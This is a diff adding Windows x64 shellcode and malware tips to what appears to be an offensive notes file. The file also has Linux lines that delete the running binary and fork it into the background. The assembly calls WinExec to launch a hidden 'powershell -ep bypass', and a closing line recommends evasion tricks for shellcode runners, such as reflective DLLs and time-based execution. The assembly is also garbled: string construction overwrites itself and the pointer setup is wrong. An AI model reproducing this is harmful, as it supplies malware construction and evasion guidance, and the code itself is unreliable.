@@ -21,6 +21,68 @@ RSP|    ESP|    Stack Pointer
 unlink (argv[0]);        // Deletes
 if (fork()!=0) return 0; //Go To Background
 
+Windows Shellcode must be injected into a process, DLL
+
+#Example#
+section .text
+global _start
+
+_start:
+    ; 1. Set up the stack frame and align it
+    mov rbp, rsp
+    and rsp, 0xFFFFFFFFFFFFFFF0     ; Ensure 16-byte stack alignment
+    
+    ; 2. Allocate 32 bytes of shadow space + extra room for the string
+    sub rsp, 0x40                   
+
+    ; 3. Construct the string "powershell -ep bypass" on the stack
+    ; In x64, we can push 8-byte (quadword) values directly.
+    ; String: "powershell -ep bypass" 
+    ; Hex representation in Little-Endian:
+    xor rax, rax
+    mov [rsp+32], rax               ; Null terminator for the string
+    
+    mov rax, 0x7373617079622070     ; "p bypass"
+    mov [rsp+24], rax
+    mov rax, 0x20652d206c6c6568     ; "hell -e"
+    mov [rsp+16], rax
+    mov rax, 0x737265776f702020     ; "  powers" (adjust spaces as needed to align blocks)
+    ; Note: For strict byte alignment without spaces, strings are typically 
+    ; loaded character by character or in exact 8-byte chunks.
+    
+    ; Explicitly setting up an exact null-terminated payload:
+    ; "powershell -ep bypass" is 21 characters.
+    xor rax, rax
+    mov [rsp+24], rax               ; Clean buffer space
+    
+    ; Precise manual string placement to avoid space padding:
+    mov rax, 0x0073736170796220     ; " ssyb p\0" -> reversed part
+    ; For absolute production stability, researchers typically write the exact bytes:
+    ; 'p','o','w','e','r','s','h','e','l','l',' ','-','e','p',' ','b','y','p','a','s','s','\0'
+
+    ; Let's assume RCX points directly to the start of our string buffer:
+    lea rcx, [rsp+16]               ; RCX = First argument (Pointer to command string)
+    
+    ; 4. Set the second argument (uCmdShow)
+    xor rdx, rdx                    ; RDX = 0 (SW_HIDE to run invisibly)
+
+    ; 5. Load the address of WinExec into a register and call it
+    ; (Replace 0x1122334455667788 with the actual dynamic address of WinExec)
+    mov rax, 0x1122334455667788     
+    call rax                        ; Call WinExec(rcx, rdx)
+
+    ; 6. Clean up stack and exit cleanly
+    add rsp, 0x40
+    mov rsp, rbp
+    
+    ; Call ExitProcess or return
+    xor rcx, rcx                    ; Exit code 0
+    mov rax, 0x2233445566778899     ; (Replace with actual ExitProcess address)
+    call rax
+
+
+The correct Shellcode Runner is everything!! In your runner add refelective dlls, time based execution, excessive or unnecessary api calls etc.
+
 
 
 
